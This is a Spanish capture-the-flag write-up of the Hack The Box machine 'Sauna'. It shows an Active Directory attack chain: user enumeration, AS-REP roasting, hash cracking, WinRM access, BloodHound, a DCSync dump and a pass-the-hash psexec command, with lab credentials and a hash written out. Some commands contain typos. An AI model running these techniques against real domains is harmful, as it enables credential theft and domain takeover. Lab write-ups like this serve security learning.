#windows #Easy #ActiveDirectory  
### Ping
 
```python
ping -c 1 10.10.10.175
PING 10.10.10.175 (10.10.10.175) 56(84) bytes of data.
64 bytes from 10.10.10.175: icmp_seq=1 ttl=127 time=152 ms

--- 10.10.10.175 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 152.043/152.043/152.043/0.000 ms
```

### TTL 127=Windows

### nmap
#Easy 
```python
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-13 08:38:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49736/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m08s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-03-13T08:38:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.36 seconds
```
podemos enumerar un domain controller  para el dominio EGOTISTICAL-BANK.LOCAL y LDAP corriendo por el puerto 80 y el 389 respectivamente

### Enumeración del puerto 445 (SMB)
utilizamos diferentes herramientas para intentar enumerar el puerto SMB pero no tenemos exito

![[Pasted image 20240611205741.png]]
### Enumeración del Domain Controller
intentaremos enumerar el domain controller usando rpcclinet pero tampoco tenemos exito

![[Pasted image 20240611205747.png]]
### Enumeración del puerto 389 (LDAP)
usaremos la herramienta [windapsearch](https://github.com/ropnop/windapsearch) para enumerar el puerto LDAP. en este caso no obtenemos nada

![[Pasted image 20240611205754.png]]
### impacket-GetADUsers
usamos la herramienta de impacket pero tampoco tenemos éxito así que seguiremos enumerando

![[Pasted image 20240611205802.png]]
### Fuzzing con ffuz

![[Pasted image 20240611205809.png]]
### Enumeración del puerto 80 (http)
vamos al directorio About Us y hacemos scroll hacia abajo 

![[Pasted image 20240611205823.png]]
### About Us
aqui podemos ver los nombres completos de algunos empleados del banco

![[Pasted image 20240611205831.png]]
### username-anarchy
vamos a usar este herramienta para hacer permutaciones entre los usuarios que hemos conseguido

![[Pasted image 20240611205843.png]]
creamos una lista de usuarios en un archivo txt

![[Pasted image 20240611205856.png]]
ahora vamos hacer algunas permutaciones en los nombres para tener muchas mas variantes
```python
# ejemplo
nombre apellido
nombre.apellido
nombre
apellido
nombrea    
napellido
```

![[Pasted image 20240611205912.png]]
### kerbrute
podemos descargar kerbruter desde [kerbrute](https://github.com/ropnop/kerbrute) 
```python 
cd kerbrute
go buil .
```
liste de esta manera ya tenemos kerbrute preparado
![[Pasted image 20240611205926.png]]

ejecutamos kerbrute
logramos conseguir un usuario valido **fsmith**
![[Pasted image 20240611205935.png]]

### impacket-GetNPUsers
El módulo `GetNPUsers` de Impacket nos permite extraer información sobre cuentas de usuario que tienen configurada la propiedad `Do Not Require Preauthentication` (no requerir autenticación previa) en un dominio de Active Directory. Esta característica de seguridad cuando está habilitada para una cuenta de usuario en particular, permite que un atacante pueda realizar ataques de captura de hash de autenticación (ASREPRoasting) contra esa cuenta.
![[Pasted image 20240611205952.png]]
logramos obtener un TGT `Ticket Granting Ticket` esto es un hash. para el usuario fsmith vamos a intentar romperlo con hashcat

### hashcat
```python
hashcat --example-hashes # podemos ver un ejemplo de todos los hashes que estan en hashcat

hashcat --example-hashes | grep krb5asrep # `krb5asrep` pertenece a el primer parametro del hash. suelen estan encerrados por el sombilo $

hashcat --example-hashes | grep krb5asrep -B 20 # -B 20 nos permite capturar las primeras 20 lineas del resultado de identificar el hash
```

con estas opciones logramos obtener el tipo de hash al que nos estamos enfrentando en este caso es `HAsh mode #18200`
![[Pasted image 20240611210021.png]]

Iniciando 
![[Pasted image 20240611210026.png]]

de esta manera logramos obtener la contraseña perteneciente a este hash

![[Pasted image 20240611210032.png]]
### crackmapexec
podemos usar crackmapexec para intentar validar estas credenciales. si vemos un `+` esto nos indica que las credenciales son validas. una vez confirmado esto también podemos usar crackmapexec winrm para saber si el usuario `fsmith` forma parte del grupo `Remote Management Users`

![[Pasted image 20240611210044.png]]
### evil-winrm
tenemos conexión
![[Pasted image 20240611210052.png]]

### Escalada de privilegios

`whoami /priv`
![[Pasted image 20240611210102.png]]

`whoami /all` podemos ver que efectivamente formamos parte del grupo `Remote Management Users` 
![[Pasted image 20240611210109.png]]

### Enumeración de usuarios en el sistema
`net localgroup "Remote Management Users"` - `net Users` 
de esta manera podemos enumerar los usuarios que pertenecen tanto al grupo local como los usuarios existentes en el sistema 
![[Pasted image 20240611210119.png]]

`usuario svc_loanmgr`
no tenemos permisos para ver el directorio del usuario
![[Pasted image 20240611210125.png]]

### winPEASx64.exe  
vamos a descargar la herramienta desde [wimpeas](https://github.com/carlospolop/PEASS-ng/releases/tag/20240310-532aceca) y la subimos a la maquina victima.
`Nota: vamos a la ruta Windows/Temp creamos un nuevo directorio, entramos y usando upload y la ruta de nuestro archivo winPEASx64.exe
![[Pasted image 20240611210138.png]]

`winPEASx64.exe`
![[Pasted image 20240611210144.png]]

`logged users`
![[Pasted image 20240611210151.png]]

`AutoLogon credential`
aqui podemos ver las credenciales del usuario `svc_loanmanager` pero anteriormente teníamos un nombre de usuario diferente

![[Pasted image 20240611210157.png]]
### rpcclient
usando las credenciales de `fsmith` podemos enumerar los usuarios de una manera diferente usando rpcclient y asegurarnos de cual es el usuario existente en este caso `svc_loanmgr`

rpcclient -U "credenciales de smith" IP unumdomusers

![[Pasted image 20240611210206.png]]

### crackmapexec
confirmamos que estas son las credenciales correctas y también podemos establecer conexión vía evil-winrm
![[Pasted image 20240611210215.png]]

### evil-winrm
obtenemos conexión
![[Pasted image 20240611210227.png]]

### Enumeración de permisos 
`whoami /priv`  `net user svc_loanmgr`
![[Pasted image 20240611210235.png]]

### BloodHound
```python
# instalar bloodhound 

sudo apt install neo4j bloodhound
```

abrimos bloodhound 
![[Pasted image 20240611210244.png]]

### SharpHound.ps1
descargamos la herramienta [SharpHound.ps1](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1) con un `wget`
![[Pasted image 20240611210251.png]]

### Upload
```python
cd C:\Windows\temp

mkdir Privesc

cd Privesc

upload /home/kali/Desktop/htb/Sauna/SharpHound.ps1

```

![[Pasted image 20240611210257.png]]

### Recopilación de información con SharpHound.ps1
```python
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```
hemos generado un archivo llamado `20240314172620_BloodHound.zip` lo descargaremos a nuestra maquina atacante para poder analizarlo
![[Pasted image 20240611210321.png]]

`download` descargaremos el archivo con el nombre BloodHound.zip 
![[Pasted image 20240611210329.png]]
### Opción 2: BloodHound-python
la herramienta BloodHound-python hace lo mismo que la herramienta SharpHound.ps1 
```python
bloodhound-pyhton -u svc_loanmgr -p Moneymakestheworldgoround! -ns (IP) -d EGOTISTICAL-BANK.LOCAL -c all
```

![[Pasted image 20240611210336.png]]

### BloodHound
iniciamos el `neo4j` con el comando `sudo neo4j console & /dev/null & disown` y luego abrimos el BloodHound
![[Pasted image 20240611210344.png]]

hacemos un `update data` 

![[Pasted image 20240611210351.png]]
### Domain Controller
aquí podemos buscar la manera mas rápida de poder convertirnos en usuarios administrador del DC `Domein Controller`
![[Pasted image 20240611210356.png]]

`generarmente me gusta buscar cada usuario que hemos comprometido y marcarlo como owned para asi poder identificarlo rapidamente`
![[Pasted image 20240611210401.png]]

### Find Degree Object Control
aquí podemos ver que el usuario `svc_loanmgr` tiene las propiedades de `GetChangesAll` , `GetChanges` y `DCSync` sobre el DC 
![[Pasted image 20240611210407.png]]

`DCSync Attack`
las propiedades del usuario `svc_loanmgr` le permite ejecutar un DCSync Attack.
![[Pasted image 20240611210414.png]]

`Windows Abuse`
Con los privilegios `GetChanges` y `GetChangesAll` se puede realizar un ataque `DCSync Attack` para obtener el hash de contraseña de un principal administrador usando mimikatz. 
![[Pasted image 20240611210420.png]]

### DCSync Attack con Impacket-secretdump
en este caso no usaremos la herramienta mimikatz debido a que Impacket-secretdump también puede realizar este tipo de ataques. 
`realizamos el ataque DCSync y obtenemos el hash NT del usuario Administrator`

Impacket-secretdump DC/user@ip

![[Pasted image 20240611210426.png]]
### impacket-psexec
con impacket-psexec podemos realizar un pass de hash utilizando el hash que hemos conseguido del usuario administrator 
`Nota: incluir cmd.exe para obtener una consola intereactiva`
```python
impacket-psexec EGITISTICAL-BANCK.LOCAL/Administrator@10.10.10.175 cmd.exe -hashes :823452073d75b9d1cf70ebdf86c7f98e
```

![[Pasted image 20240611210438.png]]

### WE ARE ROOT